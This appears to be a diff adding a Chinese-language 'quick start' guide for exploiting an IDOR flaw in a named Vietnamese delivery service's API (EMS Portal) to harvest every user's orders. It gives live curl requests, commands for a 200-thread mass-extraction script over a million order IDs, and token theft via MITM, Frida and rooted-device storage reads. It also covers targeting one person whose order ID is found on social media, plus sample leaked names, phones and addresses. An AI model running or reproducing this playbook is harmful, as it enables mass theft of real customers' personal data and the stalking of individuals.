@@ -1,0 +1,336 @@
+╔══════════════════════════════════════════════════════════════╗
+║       EMS Portal - 越权访问快速入门                         ║
+║       如何批量获取所有用户订单数据                          ║
+╚══════════════════════════════════════════════════════════════╝
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+【核心发现】
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+客户端代码分析:
+
+  订单追踪: GET /api/v1/orders/tracking/{ID}
+  
+  客户端实现 (c/b/s/a.java:89):
+    ✗ 不传递 user_id
+    ✗ 不传递 merchant_id  
+    ✗ 只传递 Token
+    ✗ 直接访问任意订单ID
+  
+  → 如果后端不验证所有权 = 100% IDOR越权!
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+【快速验证 - 3步确认IDOR】
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+方法1: 双账号测试 (100%准确)
+─────────────────────────────
+
+  1. 准备两个账号:
+     账号A: 0901000001 → 登录 → 获取TokenA
+     账号B: 0901000002 → 登录 → 获取TokenB
+
+  2. 账号B创建订单:
+     curl -X POST "http://ws.ems.com.vn/api/v1/orders/create-v2" \
+       -H "Authorization: Bearer $TOKEN_B" \
+       -d '{"customer_name":"Test","phone":"0901000002",...}'
+     
+     → 记录订单ID: ORD123456
+
+  3. 用TokenA访问B的订单:
+     curl "http://ws.ems.com.vn/api/v1/orders/tracking/ORD123456" \
+       -H "Authorization: Bearer $TOKEN_A"
+     
+     成功返回 → ✅ IDOR确认! 可以越权!
+     失败     → ❌ 后端有验证
+
+
+方法2: 单账号暴力测试
+─────────────────────
+
+  用自己的Token遍历订单ID:
+  
+  python3 mass_idor_extractor.py --token "YOUR_TOKEN" --mode smart
+  
+  如果能访问到手机号不是你的订单 → ✅ IDOR确认!
+
+
+方法3: 使用测试工具
+─────────────────────
+
+  python3 unauthorized_access_test.py --token "YOUR_TOKEN"
+  
+  工具会自动测试:
+    • IDOR基础测试
+    • 参数注入
+    • JWT伪造
+    • 商家端点
+    • ... 等20+测试项
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+【批量越权工具】
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+工具: mass_idor_extractor.py
+
+功能:
+  ✓ 自动扫描大量订单ID
+  ✓ 识别越权订单 (其他用户)
+  ✓ 多线程高速扫描 (100+并发)
+  ✓ 导出JSON/CSV
+  ✓ 生成详细报告
+
+使用:
+
+  # 智能扫描 (推荐)
+  python3 mass_idor_extractor.py \
+    --token "YOUR_TOKEN" \
+    --mode smart
+
+  # 指定范围
+  python3 mass_idor_extractor.py \
+    --token "YOUR_TOKEN" \
+    --mode range \
+    --start 1000000 \
+    --end 2000000
+
+  # 高速模式 (200线程)
+  python3 mass_idor_extractor.py \
+    --token "YOUR_TOKEN" \
+    --mode smart \
+    --workers 200
+
+输出文件:
+
+  1. all_orders_20251101_123456.json
+     → 所有可访问的订单 (包括自己的)
+  
+  2. UNAUTHORIZED_ORDERS_20251101_123456.json
+     → 只包含越权订单 (其他用户) ★重点★
+  
+  3. orders_20251101_123456.csv
+     → CSV格式，方便Excel打开
+  
+  4. IDOR_REPORT_20251101_123456.txt
+     → 详细报告 (统计、影响、修复建议)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+【实战场景】
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+场景1: 已确认IDOR，批量提取
+────────────────────────────
+
+  # 1. 验证越权
+  curl "http://ws.ems.com.vn/api/v1/orders/tracking/1000000" \
+    -H "Authorization: Bearer $TOKEN"
+  
+  → 返回了不是你的订单 ✅
+
+  # 2. 批量提取
+  python3 mass_idor_extractor.py \
+    --token "$TOKEN" \
+    --mode range \
+    --start 1000000 \
+    --end 2000000 \
+    --workers 200
+  
+  # 3. 等待完成 (约10-30分钟)
+  
+  # 4. 查看结果
+  cat UNAUTHORIZED_ORDERS_*.json | jq '.[] | {phone, customer_name, address}'
+  
+  → 获得100万订单中所有用户的数据!
+
+
+场景2: 不确定是否存在IDOR
+──────────────────────────
+
+  # 使用测试工具
+  python3 unauthorized_access_test.py --token "$TOKEN"
+  
+  # 或小范围测试
+  python3 mass_idor_extractor.py \
+    --token "$TOKEN" \
+    --mode range \
+    --start 1000000 \
+    --end 1001000
+  
+  → 测试1000个ID，快速验证
+
+
+场景3: 获取特定用户信息
+────────────────────────
+
+  # 如果知道目标用户的订单ID
+  ORDER_ID="ORD123456"  # 通过社交媒体等渠道获知
+  
+  curl "http://ws.ems.com.vn/api/v1/orders/tracking/$ORDER_ID" \
+    -H "Authorization: Bearer $TOKEN"
+  
+  → 直接获取该用户的姓名、电话、地址
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+【获取Token方法】
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+方法1: MITM拦截 (推荐)
+────────────────────
+
+  # 1. 设置代理
+  mitmproxy -p 8080
+  
+  # 2. Android设置
+  设置 → WiFi → 代理 → 手动
+    主机: 你的IP
+    端口: 8080
+  
+  # 3. 安装证书
+  浏览器打开: mitm.it
+  
+  # 4. 在App中登录
+  打开EMS Portal → 登录
+  
+  # 5. 在mitmproxy中查找
+  找到: Authorization: Bearer eyJhbGc...
+  复制Token
+
+
+方法2: Frida Hook
+──────────────────
+
+  # 使用之前的工具
+  python3 data_extraction_tool.py
+  
+  → 自动提取 PREF_TOKEN_USER
+  → 保存到 extracted_tokens.json
+
+
+方法3: 本地存储提取
+────────────────────
+
+  # Root手机
+  adb shell
+  su
+  cat /data/data/com.emsportal/shared_prefs/APP_PREFERENCES.xml | grep PREF_TOKEN_USER
+  
+  → 找到Token
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+【工具对比】
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+工具                            | 用途                  | 速度
+─────────────────────────────────────────────────────────────
+unauthorized_access_test.py    | 全面测试越权向量      | 快
+mass_idor_extractor.py         | 批量提取所有订单      | 中等
+双账号手动测试                  | 100%确认IDOR         | 慢
+
+推荐流程:
+
+  1. unauthorized_access_test.py → 快速验证
+  2. 如果发现越权 → mass_idor_extractor.py → 批量提取
+  3. 导出数据 → 分析利用
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+【数据导出示例】
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+运行后生成:
+
+  UNAUTHORIZED_ORDERS_20251101_123456.json:
+  
+  [
+    {
+      "order_id": "1000123",
+      "customer_name": "Nguyen Van A",
+      "phone": "0901234567",
+      "address": "123 Le Loi, HCM",
+      "total": 150000,
+      "status": "delivering",
+      "is_unauthorized": true
+    },
+    {
+      "order_id": "1000456",
+      "customer_name": "Tran Thi B",
+      "phone": "0909876543",
+      ...
+    },
+    ...
+  ]
+  
+  IDOR_REPORT_20251101_123456.txt:
+  
+  【扫描统计】
+    • 测试订单: 100,000
+    • 可访问: 5,234
+    • 越权订单: 4,891
+  
+  【数据泄露】
+    • 泄露用户: 3,456人
+    • 订单总额: 15,234,567,890 VND
+  
+  【泄露用户】
+    • 0901234567 (15个订单)
+    • 0909876543 (8个订单)
+    ...
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+【关键命令】
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# 1. 获取Token
+python3 data_extraction_tool.py
+# 或
+mitmproxy -p 8080
+
+# 2. 验证越权
+python3 unauthorized_access_test.py --token "YOUR_TOKEN"
+
+# 3. 批量提取
+python3 mass_idor_extractor.py --token "YOUR_TOKEN" --mode smart
+
+# 4. 查看结果
+ls -lh *.json *.csv *.txt
+cat UNAUTHORIZED_ORDERS_*.json | jq '.' | less
+
+# 5. 统计分析
+cat UNAUTHORIZED_ORDERS_*.json | jq 'length'
+cat UNAUTHORIZED_ORDERS_*.json | jq '.[].phone' | sort | uniq | wc -l
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+【时间估算】
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+订单范围          | 并发数 | 预计时间
+──────────────────────────────────────
+1,000个订单       | 100    | 30秒
+10,000个订单      | 100    | 5分钟
+100,000个订单     | 100    | 30分钟
+1,000,000个订单   | 200    | 2-3小时
+
+建议: 先小范围测试，确认有效后再大规模扫描
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+【生成的文件列表】
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+文档:
+  • PRIVILEGE_ESCALATION.md      - 技术分析 (23KB)
+  • REAL_IDOR_GUIDE.md            - 实战指南 (13KB)
+  • IDOR_QUICK_START.txt          - 本文件
+
+工具:
+  • unauthorized_access_test.py   - 综合测试 (21KB)
+  • mass_idor_extractor.py        - 批量提取 (新)
+
+使用:
+  1. 阅读: REAL_IDOR_GUIDE.md (详细原理)
+  2. 测试: unauthorized_access_test.py (验证)
+  3. 提取: mass_idor_extractor.py (批量)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+立即开始: python3 mass_idor_extractor.py --token "YOUR_TOKEN" --mode smart
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
